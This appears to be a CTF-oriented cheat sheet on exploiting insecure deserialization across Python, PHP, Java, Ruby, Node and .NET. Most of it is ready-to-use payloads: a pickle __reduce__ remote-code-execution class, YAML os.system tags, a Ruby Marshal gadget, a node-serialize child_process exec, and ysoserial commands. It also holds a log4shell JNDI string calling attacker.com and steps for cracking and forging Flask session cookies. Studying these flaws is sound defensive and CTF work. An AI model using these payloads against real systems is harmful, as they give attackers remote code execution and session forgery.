# Insecure Deserialization

Server deserializes attacker-controlled bytes → arbitrary object graph → RCE. Common in Python (pickle), PHP (`unserialize`), Java (ObjectInputStream), Ruby (Marshal), Node (node-serialize).

## Identify

Signals:
- Cookie / query / body that looks base64 or binary.
- Prefix bytes: `b'\x80\x04'` (pickle), `O:` (PHP), `\xac\xed` (Java), `{"rce":_$$ND_FUNC$$_` (node-serialize).
- Framework strings in cookie value: `rails`, `django`, `phalcon`, `yaml`.
- Error messages mentioning `unserialize`, `pickle.loads`, `ObjectInputStream`.

Decode suspected cookies first:
```bash
echo '<cookie>' | base64 -d | xxd | head
cipher-id --try '<cookie>'
```

## Python — pickle

**Any `pickle.loads(user_input)` = instant RCE.**

```python
import pickle, base64
class Exploit:
    def __reduce__(self):
        return (__import__('os').system, ('id > /tmp/pwn',))

payload = base64.b64encode(pickle.dumps(Exploit())).decode()
print(payload)
```

Also exploitable: `cPickle.loads`, `pickle.load`, `shelve.open(user_path)`, `jsonpickle.decode`, `pandas.read_pickle`.

**YAML (via `yaml.load` without SafeLoader):**
```yaml
!!python/object/apply:os.system ["id > /tmp/pwn"]
# or:
!!python/object/new:subprocess.check_output [["id"]]
```

Pass to any endpoint that calls `yaml.load(data)` (without `Loader=SafeLoader`).

## PHP — unserialize

Needs a "gadget chain": a class in scope with a magic method (`__wakeup`, `__destruct`, `__toString`) that reaches `system()` / `eval()` / `include()`.

```php
// Target has class Exploit with __destruct() that calls system($this->cmd)
O:7:"Exploit":1:{s:3:"cmd";s:2:"id";}
```

Dedicated tooling (not on CSG approved list but conceptually):
- **PHPGGC** — pre-built gadget chains for Symfony, Laravel, Monolog, Guzzle, Doctrine, etc.

Hand-craft when the app has a custom gadget visible in source:
```bash
# format: O:<len>:"<classname>":<field_count>:{<fields>}
# field: s:<len>:"<name>";<serialized_value>
```

## Java — ObjectInputStream

Target: any `readObject()` on untrusted bytes. Marker bytes `\xac\xed\x00\x05`.

Gadgets:
- **ysoserial** generates payloads for CommonsCollections, Groovy, Spring, Hibernate, etc.
- CTF typically ships with a vulnerable library in the classpath — identify from `pom.xml` / `build.gradle` / `META-INF/MANIFEST.MF` of the WAR/JAR.

```bash
java -jar ysoserial.jar CommonsCollections5 'id > /tmp/pwn' | base64
```

JNDI / log4shell variants (CVE-2021-44228):
```
${jndi:ldap://attacker.com/x}
```
Fire into any header/field that gets logged.

## Ruby — Marshal

```ruby
require 'erb'
template = ERB.allocate
template.instance_variable_set :@src, "`id > /tmp/pwn`"
template.instance_variable_set :@filename, '1'
template.instance_variable_set :@lineno, 1
payload = [Gem::Requirement.new, Gem::Dependency.new('x').tap{|d| d.instance_variable_set :@requirement, template}]
puts Marshal.dump(payload).unpack('H*').first
```

## Node.js — node-serialize

**`node-serialize` package is specifically unsafe** (don't confuse with safe-serialize/serialize-javascript):
```js
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id')}()"}
```

## .NET — BinaryFormatter

Any `new BinaryFormatter().Deserialize()` = pwn with ysoserial.net:
```bash
ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c 'calc.exe'
```

Common sinks: `JavaScriptSerializer`, `DataContractSerializer`, `NetDataContractSerializer`, `BinaryFormatter`, `ObjectStateFormatter`, `LosFormatter`.

## Flask session cookies (signed, not encrypted)

```bash
flask-cookie decode '<cookie>'                                    # read role, user, etc.
flask-cookie crack  '<cookie>' /usr/share/wordlists/rockyou.txt   # find SECRET_KEY
flask-cookie forge  '{"user":"admin"}' '<SECRET_KEY>'             # mint a session
```

## Django signed cookies

If `SECRET_KEY` leaks, you can forge signed cookies and (depending on backend) a `PickleSerializer` session = RCE. Default session backend is JSON in modern Django; older apps using pickle are RCE.

## Hunting

In whitebox:
```bash
rg -n 'unserialize\s*\(|pickle\.loads?\s*\(|ObjectInputStream|readObject|Marshal\.load|yaml\.load\s*\((?!.*SafeLoader)|node-serialize|BinaryFormatter' --glob '!node_modules'
cve-scan --source <dir>              # does the above automatically
```

## Offline reference

```bash
ls /opt/tools/PayloadsAllTheThings/Insecure\ Deserialization/
rg -n 'deserial|pickle|unserialize' /opt/tools/HackTricks/
```

## Tips
- A `__reduce__` method is the one-liner for pickle RCE — no gadget needed, Python itself is the gadget.
- Base64 cookies that decode to bytes starting `\x80` = pickle. Starting `O:` = PHP serialize. Starting `\xac\xed` = Java.
- `yaml.load(x)` without `Loader=SafeLoader` is RCE every time — grep for it in Python source.
- Node `require('serialize-javascript')` is SAFE; `require('node-serialize')` is NOT. Easy mix-up.
- CVE-2021-44228 (log4shell) is deserialization-adjacent — the JNDI lookup fetches and loads a remote Java class.
